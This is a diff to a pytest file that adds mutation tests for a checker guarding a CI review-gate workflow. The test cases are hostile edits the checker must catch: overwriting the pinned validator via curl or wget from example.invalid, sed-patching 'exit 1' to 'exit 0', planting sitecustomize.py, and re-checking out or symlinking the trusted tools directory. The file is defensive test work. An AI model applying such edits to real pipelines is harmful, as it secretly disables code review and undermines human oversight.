@@ -325,6 +325,40 @@ _CONE = "          sparse-checkout-cone-mode: false\n"
 _REF = r"^(?P<lead>\s+)ref:(?P<gap>\s*)(?P<sha>[0-9a-f]{40})[ \t]*$"
 _SCRIPT_PATH = '          SCRIPT_PATH=".review-gate-tools/scripts/validate_review.py"\n'
 _RUN = '          OUTPUT=$(python3 "$SCRIPT_PATH" 2>&1)\n'
+_SETUP = "      - name: Set up Python\n"  # first step after the tooling checkout
+_UPDATE = "      - name: Update PR Status\n"  # first step after the validator run
+_TOOLING_PATH = "          path: .review-gate-tools\n"
+
+
+def _step_before(anchor: str, step: str) -> Mutation:
+    return _sub(anchor, step + anchor)
+
+
+def _before_run(line: str) -> Mutation:
+    """Insert one shell line into the validator's run block, just before it runs."""
+    return _sub(_RUN, f"          {line}\n" + _RUN)
+
+
+def _checkout_into(path_line: str, *, ref: str = "main") -> str:
+    return (
+        "      - name: Replace tooling checkout\n"
+        "        uses: actions/checkout@v4\n"
+        "        with:\n"
+        "          repository: 'elevanaltd/hestai-context-mcp'\n"
+        f"          ref: {ref}\n"
+        f"          {path_line}\n"
+        "\n"
+    )
+
+
+def _move_tooling_after_validator(text: str) -> str:
+    lines = text.splitlines(keepends=True)
+    span = _tooling_step_span(text)
+    block, rest = lines[span.start : span.stop], lines[: span.start] + lines[span.stop :]
+    assert rest.count(_UPDATE) == 1, f"mutation anchor must occur exactly once: {_UPDATE!r}"
+    at = rest.index(_UPDATE)
+    return "".join(rest[:at] + block + rest[at:])
+
 
 MUTATIONS = [
     # ref: anything but a full lowercase SHA
@@ -487,6 +521,163 @@ MUTATIONS = [
         "validator_invocation",
         id="defaults-working-directory",
     ),
+    # (a) single writer: only the pinned tooling step may target .review-gate-tools
+    pytest.param(
+        _step_before(_SETUP, _checkout_into("path: '.review-gate-tools'")),
+        "single_writer",
+        id="second-checkout-quoted-values",
+    ),
+    pytest.param(
+        _step_before(_SETUP, _checkout_into("path: ./.review-gate-tools")),
+        "single_writer",
+        id="second-checkout-dot-slash",
+    ),
+    pytest.param(
+        _step_before(_SETUP, _checkout_into('path: ".review-gate-tools/"')),
+        "single_writer",
+        id="second-checkout-trailing-slash",
+    ),
+    pytest.param(
+        _step_before(_SETUP, _checkout_into('"path": .review-gate-tools')),
+        "single_writer",
+        id="second-checkout-quoted-key",
+    ),
+    pytest.param(
+        _step_before(
+            _SETUP,
+            _checkout_into(
+                "path: .review-gate-tools", ref="7153bfd1e788f342617d258e978edbf577550e8f"
+            ),
+        ),
+        "single_writer",
+        id="second-checkout-same-sha",
+    ),
+    pytest.param(
+        _step_before(_NAME, _checkout_into("path: .review-gate-tools")),
+        "single_writer",
+        id="second-checkout-before-tooling",
+    ),
+    pytest.param(
+        _step_before(_UPDATE, _checkout_into("path: .review-gate-tools")),
+        "single_writer",
+        id="second-checkout-after-validator",
+    ),
+    pytest.param(
+        _step_before(
+            _SETUP,
+            "      - name: Fetch judge\n"
+            "        uses: actions/download-artifact@v4\n"
+            "        with:\n"
+            "          name: judge\n"
+            "          path: .review-gate-tools\n"
+            "\n",
+        ),
+        "single_writer",
+        id="download-artifact-into-trusted",
+    ),
+    # (b) no run body writes into .review-gate-tools
+    pytest.param(
+        _before_run('cp -r "$RUNNER_TEMP/judge/." .review-gate-tools/'),
+        "no_run_writes",
+        id="run-cp",
+    ),
+    pytest.param(
+        _before_run('mv "$RUNNER_TEMP/judge" .review-gate-tools/scripts'),
+        "no_run_writes",
+        id="run-mv",
+    ),
+    pytest.param(_before_run("rm -rf .review-gate-tools/scripts"), "no_run_writes", id="run-rm"),
+    pytest.param(
+        _before_run('ln -sfn "$PWD/scripts" .review-gate-tools/scripts'),
+        "no_run_writes",
+        id="run-ln",
+    ),
+    pytest.param(
+        _before_run("tee .review-gate-tools/scripts/sitecustomize.py < /dev/null"),
+        "no_run_writes",
+        id="run-tee",
+    ),
+    pytest.param(
+        _before_run("echo 'import os' > .review-gate-tools/scripts/sitecustomize.py"),
+        "no_run_writes",
+        id="run-redirect",
+    ),
+    pytest.param(
+        _before_run("printf 'x' >> ./.review-gate-tools/scripts/sitecustomize.py"),
+        "no_run_writes",
+        id="run-append",
+    ),
+    pytest.param(
+        _before_run("git -C .review-gate-tools fetch origin main"),
+        "no_run_writes",
+        id="run-git-dash-c",
+    ),
+    pytest.param(
+        _step_before(
+            _SETUP,
+            "      - name: Refresh tools\n"
+            "        run: |\n"
+            "          cd .review-gate-tools\n"
+            "          git checkout main\n"
+            "\n",
+        ),
+        "no_run_writes",
+        id="run-cd-then-write",
+    ),
+    pytest.param(
+        _before_run(
+            "curl -sSfL https://example.invalid/v.py -o .review-gate-tools/scripts/validate_review.py"
+        ),
+        "no_run_writes",
+        id="run-curl-o",
+    ),
+    pytest.param(
+        _before_run(
+            "wget -q -O .review-gate-tools/scripts/validate_review.py https://example.invalid/v.py"
+        ),
+        "no_run_writes",
+        id="run-wget-o",
+    ),
+    pytest.param(
+        _before_run("sed -i 's/exit 1/exit 0/' .review-gate-tools/scripts/validate_review.py"),
+        "no_run_writes",
+        id="run-sed-in-place",
+    ),
+    # (c) order: nothing between the pinned checkout and the validator run touches the judge
+    pytest.param(
+        _step_before(
+            _SETUP,
+            "      - name: Sync tools\n"
+            "        uses: example/sync-action@v1\n"
+            "        with:\n"
+            "          destination: .review-gate-tools\n"
+            "\n",
+        ),
+        "order",
+        id="between-step-action-input",
+    ),
+    pytest.param(
+        _step_before(
+            _SETUP,
+            "      - name: Patch judge\n"
+            "        uses: actions/github-script@v7\n"
+            "        with:\n"
+            "          script: |\n"
+            "            require('fs').writeFileSync('.review-gate-tools/scripts/x.py', '')\n"
+            "\n",
+        ),
+        "order",
+        id="between-step-github-script",
+    ),
+    pytest.param(
+        _sub(
+            "          python-version: '3.11'\n",
+            "          python-version: '3.11'\n        env:\n          PIP_TARGET: .review-gate-tools\n",
+        ),
+        "order",
+        id="between-step-env",
+    ),
+    pytest.param(_move_tooling_after_validator, "order", id="tooling-after-validator"),
 ]
 
 EQUIVALENT_EDITS = [
@@ -507,6 +698,24 @@ EQUIVALENT_EDITS = [
     ),
     pytest.param(
         _sub(_RUN, '          OUTPUT=$(python3 "${SCRIPT_PATH}" 2>&1)\n'), id="run-line-braced"
+    ),
+    pytest.param(
+        _sub(_TOOLING_PATH, "          path: '.review-gate-tools'\n"), id="tooling-path-quoted"
+    ),
+    pytest.param(
+        _sub(_TOOLING_PATH, "          path: ./.review-gate-tools\n"), id="tooling-path-dot-slash"
+    ),
+    pytest.param(
+        _sub(_TOOLING_PATH, "          path: .review-gate-tools/\n"),
+        id="tooling-path-trailing-slash",
+    ),
+    pytest.param(
+        _before_run("sha256sum .review-gate-tools/scripts/validate_review.py"),
+        id="validator-step-read",
+    ),
+    pytest.param(
+        _step_before(_SETUP, "      - name: Show tools\n        run: ls -R .review-gate-tools\n\n"),
+        id="between-step-read-only",
     ),
 ]
 
